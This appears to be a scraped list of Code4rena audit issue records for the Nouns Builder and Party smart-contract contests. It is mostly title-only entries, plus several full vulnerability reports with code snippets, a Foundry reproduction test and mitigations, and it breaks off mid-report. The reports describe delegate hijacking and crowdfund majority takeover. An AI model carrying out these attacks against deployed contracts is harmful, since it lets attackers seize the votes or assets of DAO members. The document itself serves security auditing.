"2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/104", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/102", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Founder information not stored if ownership percentage is zero", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/98", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "Founder information not stored if ownership percentage is zero"}, {"title": "Owners receive more percentage of total nft if some nfts were burned(because were not sold)", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/94", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L71-L126 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L154 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L207-L213   # Vulnerability details  ## Impact According to nouns builder, founder can have percentage of created nft. This is set in `Token::_addFounders` function.  When new nft is minted by `mint` function then total supply of tokens is incremented and assigned to tokenId using `tokenId = settings.totalSupply++`. Then this token is checked if it should be mint to founder(then again increment total supply of tokens) or should be mint to auction using `while (_isForFounder(tokenId))`.  If token wasn't sold during the auction then auction burns it using `burn` function. And this function doesn't decrement `settings.totalSupply` value. But total supply **has changed** now, it has decreased by one.  So suppose that we have 1 founder of dao that should receive 2% of nft, that means that if 100 nft are available(for example), then 2 of them belongs to that founder. If we have minted 100 nft and 10 of them were not sold(they were then burned), then there are 90 nft available now. And in current implementation founder has ownership of 2 of them, however **2 is not 2% of 90**. So in case when nft are not sold on auction the percentage of founder's tokens is increasing and the increasing speed depends on how many tokens were not sold. Also founder gets more power in the community(as he has more percentage now).   ## Proof of Concept https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L71-L126 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L154 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L207-L213  ## Tools Used  ## Recommended Mitigation Steps When `burn` function is called then do `settings.totalSupply--`."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/87", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/81", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/80", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/71", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "MetadataRenderer contract raise error when minting", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/69", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L194   # Vulnerability details  ## Impact It is not possible to mint a ERC721 token if its properties has different length than it's items.  ## Proof of Concept  I run the following test to reproduce the error:          deployMock();          vm.prank(address(governor));         string[] memory _names = new string[](1);         _names[0] = \"propertyName\"; //fill _names with some value         MetadataRendererTypesV1.ItemParam[] memory _items; //define empty array                  MetadataRendererTypesV1.IPFSGroup memory _ipfsGroup;          _ipfsGroup.baseUri = \"\";         _ipfsGroup.extension = \"\";         MetadataRenderer(token.metadataRenderer()).addProperties(_names, _items, _ipfsGroup); //call add property with _items array empty.          vm.stopPrank();         vm.prank(address(auction));          uint256 success = token.mint();//error happens inside here         assert(success != 0);          vm.stopPrank();           Log from Foundry console:      \u251c\u2500 [736] TOKEN::metadataRenderer() [staticcall]     \u2502   \u251c\u2500 [353] Token::metadataRenderer() [delegatecall]     \u2502   \u2502   \u2514\u2500 \u2190 METADATA_RENDERER: [0x7076fd06ec2d09d4679d9c35a8db81ace7a07ee2]     \u2502   \u2514\u2500 \u2190 METADATA_RENDERER: [0x7076fd06ec2d09d4679d9c35a8db81ace7a07ee2]     \u251c\u2500 [78618] METADATA_RENDERER::addProperties([\"propertyName\"], [], (\"\", \"\"))     \u2502   \u251c\u2500 [78172] MetadataRenderer::addProperties([\"propertyName\"], [], (\"\", \"\")) [delegatecall]     \u2502   \u2502   \u251c\u2500 emit OwnerUpdated(prevOwner: FOUNDER: [0xd3562fd10840f6ba56112927f7996b7c16edfcc1], newOwner: TREASURY: [0xf8cf955543f1ce957b81c1786be64d5fc96ad7b5])           \u2502   \u2502   \u251c\u2500 emit PropertyAdded(id: 0, name: \"propertyName\")     \u2502   \u2502   \u2514\u2500 \u2190 ()     \u2502   \u2514\u2500 \u2190 ()     \u251c\u2500 [0] VM::stopPrank()     \u2502   \u2514\u2500 \u2190 ()     \u251c\u2500 [0] VM::prank(AUCTION: [0x9a1450e42d752b8731bc88f20dbaa9154642f1e6])     \u2502   \u2514\u2500 \u2190 ()     \u251c\u2500 [121037] TOKEN::mint()     \u2502   \u251c\u2500 [120650] Token::mint() [delegatecall]     \u2502   \u2502   \u251c\u2500 emit Transfer(from: 0x0000000000000000000000000000000000000000, to: FOUNDER: [0xd3562fd10840f6ba56112927f7996b7c16edfcc1], tokenId: 0)     \u2502   \u2502   \u251c\u2500 emit DelegateVotesChanged(delegate: FOUNDER: [0xd3562fd10840f6ba56112927f7996b7c16edfcc1], prevTotalVotes: 0, newTotalVotes: 1)     \u2502   \u2502   \u251c\u2500 [25762] METADATA_RENDERER::onMinted(0)     \u2502   \u2502   \u2502   \u251c\u2500 [25372] MetadataRenderer::onMinted(0) [delegatecall]     \u2502   \u2502   \u2502   \u2502   \u2514\u2500 \u2190 \"Division or modulo by 0\"     \u2502   \u2502   \u2502   \u2514\u2500 \u2190 \"Division or modulo by 0\"     \u2502   \u2502   \u2514\u2500 \u2190 \"Division or modulo by 0\"     \u2502   \u2514\u2500 \u2190 \"Division or modulo by 0\"     \u2514\u2500 \u2190 \"Division or modulo by 0\"    ## Tools Used Foundry Manual  ## Recommended Mitigation Steps It could be mitigated checking length of both arrays in MetadataRenderer.addProperties() method.  It could be done after those lines: https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L111-L115  Also I recommend to move those declaration and new validation at the beginning to save gas."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/63", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/61", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/60", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/58", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/57", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/56", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "USE SAFETRANSFER()/SAFETRANSFERFROM() INSTEAD OF TRANSFER()/TRANSFERFROM()", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/55", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "USE SAFETRANSFER()/SAFETRANSFERFROM() INSTEAD OF TRANSFER()/TRANSFERFROM()"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/50", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/49", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/48", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/47", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/45", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/42", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/40", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/38", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/35", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/33", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/30", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/28", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/26", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/19", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Unchecked Arrays in the execute Function", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/18", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "Unchecked Arrays in the execute Function"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/15", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/14", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/12", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/6", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/1", "labels": [], "target": "2022-09-nouns-builder-findings", "body": "Agreements & Disclosures"}, {"title": "Previously nominated delegate can reset the delegation", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/361", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "high quality report", "resolved", "sponsor confirmed", "old-submission-method"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L167-L171   # Vulnerability details       burn() allows for previously recorded delegate to set himself to be contributor's delegate even if another one was already chosen.  This can be quite material as owner choice for the whole voting power is being reset this way to favor the old delegate.  ## Proof of Concept  _burn() can be invoked by anyone on the behalf of any `contributor`:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L167-L171  ```solidity     function burn(address payable contributor)         public     {         return _burn(contributor, getCrowdfundLifecycle(), party);     } ```  It mints the governance NFT for the contributor whenever he has voting power:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L471-L485  ```solidity         if (votingPower > 0) {             // Get the address to delegate voting power to. If null, delegate to self.             address delegate = delegationsByContributor[contributor];             if (delegate == address(0)) {                 // Delegate can be unset for the split recipient if they never                 // contribute. Self-delegate if this occurs.                 delegate = contributor;             }             // Mint governance NFT for the contributor.             party_.mint(                 contributor,                 votingPower,                 delegate             );         } ```  Now mint() calls _adjustVotingPower() with a new delegate, redirecting all the intristic power, not just one for that id, ignoring the delegation the `owner` might already have:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernanceNFT.sol#L120-L133  ```solidity     function mint(         address owner,         uint256 votingPower,         address delegate     )         external         onlyMinter         onlyDelegateCall     {         uint256 tokenId = ++tokenCount;         votingPowerByTokenId[tokenId] = votingPower;         _adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), delegate);         _mint(owner, tokenId);     } ```  I.e. Bob the contributor can take part in the crowdfunding with contribute() with small `0.01 ETH` stake, stating Mike as the delegate of his choice with `contribute(Mike, ...)`:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L189-L208  ```solidity     /// @param delegate The address to delegate to for the governance phase.     /// @param gateData Data to pass to the gatekeeper to prove eligibility.     function contribute(address delegate, bytes memory gateData)         public         payable     {         _contribute(             msg.sender,             msg.value.safeCastUint256ToUint96(),             delegate,             // We cannot use `address(this).balance - msg.value` as the previous             // total contributions in case someone forces (suicides) ETH into this             // contract. This wouldn't be such a big deal for open crowdfunds             // but private ones (protected by a gatekeeper) could be griefed             // because it would ultimately result in governance power that             // is unattributed/unclaimable, meaning that party will never be             // able to reach 100% consensus.             totalContributions,             gateData         ); ```  Then crowdfund was a success, party was created, and Melany, who also participated, per off-chain arrangement has transferred to Bob a `tokenId` with big voting power (say it is `100 ETH` and the majority of voting power):  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernanceNFT.sol#L146-L155  ```solidity     /// @inheritdoc ERC721     function safeTransferFrom(address owner, address to, uint256 tokenId)         public         override         onlyDelegateCall     {         // Transfer voting along with token.         _transferVotingPower(owner, to, votingPowerByTokenId[tokenId]);         super.safeTransferFrom(owner, to, tokenId);     } ```  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernance.sol#L879-L887  ```solidity     // Transfers some voting power of `from` to `to`. The total voting power of     // their respective delegates will be updated as well.     function _transferVotingPower(address from, address to, uint256 power)         internal     {         int192 powerI192 = power.safeCastUint256ToInt192();         _adjustVotingPower(from, -powerI192, address(0));         _adjustVotingPower(to, powerI192, address(0));     } ```  Bob don't care about his early small contribution and focuses on managing the one that Melany transferred instead as he simply don't need the voting power from the initial `0.01 ETH` contribution anymore.  The actual delegate for Bob at the moment is Linda, while his business with Mike is over. So Bob sets her address there, calling `delegateVotingPower(Linda)`:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernance.sol#L448-L454  ```solidity     /// @notice Pledge your intrinsic voting power to a new delegate, removing it from     ///         the old one (if any).     /// @param delegate The address to delegating voting power to.     function delegateVotingPower(address delegate) external onlyDelegateCall {         _adjustVotingPower(msg.sender, 0, delegate);         emit VotingPowerDelegated(msg.sender, delegate);     } ```  Now, Mike can unilaterally delegate to himself the whole voting power with `burn(Bob)` as mint() just resets the delegation with the previously recorded value with `_adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), delegate)`.  ## Recommended Mitigation Steps  The issue is that mint() always assumes that it is the first operation for the `owner`, which might not always be the case.  Consider not changing the delegate on `mint` if one is set already:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernanceNFT.sol#L120-L133  ```solidity     function mint(         address owner,         uint256 votingPower,         address delegate     )         external         onlyMinter         onlyDelegateCall     {         uint256 tokenId = ++tokenCount;         votingPowerByTokenId[tokenId] = votingPower; +       address actualDelegate = <get_current_delegate>; +       if (actualDelegate == address(0)) actualDelegate = delegate; -       _adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), delegate); +       _adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), actualDelegate);         _mint(owner, tokenId);     } ```  More complicated version might be the one with tracking the most recent request via contribute()/delegateVotingPower() calls timestamps. Here we assume that the delegateVotingPower() holds more information as in the majority of practical cases it occurs after initial contribute() and it is a direct voluntary call from the owner.   "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/360", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/357", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": " No Address zero check", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/352", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": " No Address zero check"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/350", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged", "old-submission-method"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/349", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/348", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/347", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/346", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged", "old-submission-method"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/345", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/344", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/342", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/339", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/338", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/337", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/333", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/332", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/331", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/328", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/327", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/326", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged", "edited-by-warden"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/325", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged", "edited-by-warden"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/324", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged", "edited-by-warden"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/323", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/322", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/321", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/319", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/318", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/317", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/316", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/314", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/313", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Use `_safeMint()` instead of `_mint()`", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/312", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-09-party-findings", "body": "Use `_safeMint()` instead of `_mint()`"}, {"title": "Any user can create distribution to gain funds from TokenDistributor contract", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/308", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Any user can create distribution to gain funds from TokenDistributor contract"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/307", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/305", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/304", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/302", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/301", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/298", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/297", "labels": ["bug", "G (Gas Optimization)", "low quality report", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/296", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/295", "labels": ["bug", "low quality report", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Tokens with balance modifications outside of transfers not supported in TokenDistributor", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/294", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged", "edited-by-warden"], "target": "2022-09-party-findings", "body": "Tokens with balance modifications outside of transfers not supported in TokenDistributor"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/293", "labels": ["bug", "high quality report", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-party-findings", "body": "QA Report"}, {"title": "Early contributor can always become majority of crowdfund leading to rugging risks.", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/284", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed", "old-submission-method"], "target": "2022-09-party-findings", "body": "# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/BuyCrowdfundBase.sol#L114-L135   # Vulnerability details  ## Description Voting power is distributed to crowdfund contributors according to the amount contributed divided by NFT purchase price. Attacker can call the buy() function of BuyCrowdfund / CollectionBuyCrowdfund, and use only the first X amount of contribution from the crowdfund, such that attacker's contribution > X/2. He will pass his contract to the buy call, which will receive X and will need to add some additional funds, to purchase the NFT. If the purchase is successful, attacker will have majority rule in the created party. If the party does not do anything malicious, this is a losing move for attacker, because the funds they added on top of X to compensate for the NFT price will eventually be split between group members. However, with majority rule there are various different exploitation vectors attacker may use to steal the NFT from the party ( detailed in separate reports). Because it is accepted that single actor majority is dangerous, but without additional vulnerabilities attacker cannot take ownership of the party's assets, I classify this as 